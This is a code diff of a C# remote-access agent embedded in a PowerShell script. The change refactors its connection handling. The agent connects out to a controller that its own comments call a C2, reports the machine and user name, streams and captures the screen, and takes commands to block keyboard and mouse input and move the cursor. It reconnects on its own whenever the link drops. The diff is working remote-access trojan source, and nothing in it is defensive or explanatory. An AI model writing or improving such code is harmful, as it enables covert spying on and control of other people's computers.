@@ -84,10 +84,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         static string IP;
         static int PORT;
-        static TcpClient client;
-        static NetworkStream stream;
-        static StreamReader reader;
-        static StreamWriter writer;
         static bool streaming = false;
         static object writeLock = new object();
 
@@ -97,33 +93,36 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
+            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
             while (true) {
+                TcpClient myClient = null;
                 try {
-                    client = new TcpClient();
-                    client.Connect(IP, PORT);
-                    client.NoDelay = true;
-                    stream = client.GetStream();
-                    reader = new StreamReader(stream, new UTF8Encoding(false));
-                    writer = new StreamWriter(stream, new UTF8Encoding(false));
-                    writer.AutoFlush = true;
+                    myClient = new TcpClient();
+                    myClient.Connect(IP, PORT);
+                    myClient.NoDelay = true;
+                    NetworkStream myStream = myClient.GetStream();
+                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
+                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
+                    myWriter.AutoFlush = true;
 
-                    Send("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
+                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
-                    Thread tRead = new Thread(ReadLoop); tRead.IsBackground = true; tRead.Start();
-                    Thread tStream = new Thread(StreamLoop); tStream.IsBackground = true; tStream.Start();
-                    Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
+                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
+                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
-                    // Loop de verificação para forçar a reconexão quando o controlador fecha
-                    while (client.Connected) {
-                        if (stream.Socket.Poll(1000, SelectMode.SelectRead) && stream.Socket.Available == 0) break;
+                    // Fica travado aqui enquanto a conexão existir. Poll detecta se o C2 fechou.
+                    while (myClient.Connected) {
+                        if (myStream.Socket.Poll(1000, SelectMode.SelectRead) && myStream.Socket.Available == 0) break;
                         Thread.Sleep(100);
                     }
                 } catch { 
                     Thread.Sleep(3000); 
                 } finally {
-                    try { client.Close(); } catch {}
+                    streaming = false;
+                    try { if (myClient != null) myClient.Close(); } catch {}
                 }
             }
         }
@@ -155,20 +154,15 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
-        static void Send(string msg) {
-            try { lock (writeLock) { writer.WriteLine(msg); } } catch {}
-        }
-
-        static void ReadLoop() {
+        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
             try {
-                while (true) {
-                    string cmd = reader.ReadLine();
-                    if (cmd == null) break; // Conexão fechada pelo C2
-                    ProcessCommand(cmd.Trim());
+                while (myClient.Connected) {
+                    string cmd = myReader.ReadLine();
+                    if (cmd == null) break;
+                    ProcessCommand(cmd.Trim(), myWriter);
                 }
             } catch {}
-            // Força o loop principal a cair e tentar reconectar imediatamente
-            try { client.Close(); } catch {}
+            try { myClient.Close(); } catch {}
         }
 
         static void InputLoop() {
@@ -182,26 +176,28 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(5);
+                Thread.Sleep(10);
             }
         }
 
-        static void StreamLoop() {
-            while (true) {
+        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
+            while (myClient.Connected) {
                 try {
-                    if (streaming && client.Connected) {
+                    if (streaming) {
                         string b64 = CaptureScreen(1280, 40);
-                        if (b64 != null) Send("SCREEN:" + b64);
+                        if (b64 != null) {
+                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
+                        }
                         Thread.Sleep(30); 
                     } else { Thread.Sleep(50); }
                 } catch { Thread.Sleep(1000); }
             }
         }
 
-        static void ProcessCommand(string cmd) {
+        static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 if (cmd == "stream_start") { streaming = true; return; }
-                if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
+                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
@@ -217,10 +213,10 @@ if (-not ("R9KAgent" -as [type])) {
                     Environment.Exit(0); 
                 }
                 
-                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); Send("MOUSE_LOCKED"); return; }
-                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); Send("MOUSE_UNLOCKED"); return; }
-                if (cmd == "screenshot") { Send("SCREEN:" + CaptureScreen(1920, 85)); return; }
-                if (cmd == "ping") { Send("PONG"); return; }
+                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_LOCKED"); } return; }
+                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_UNLOCKED"); } return; }
+                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
+                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
                 if (cmd.StartsWith("move ")) {
                     string[] p = cmd.Split(' ');
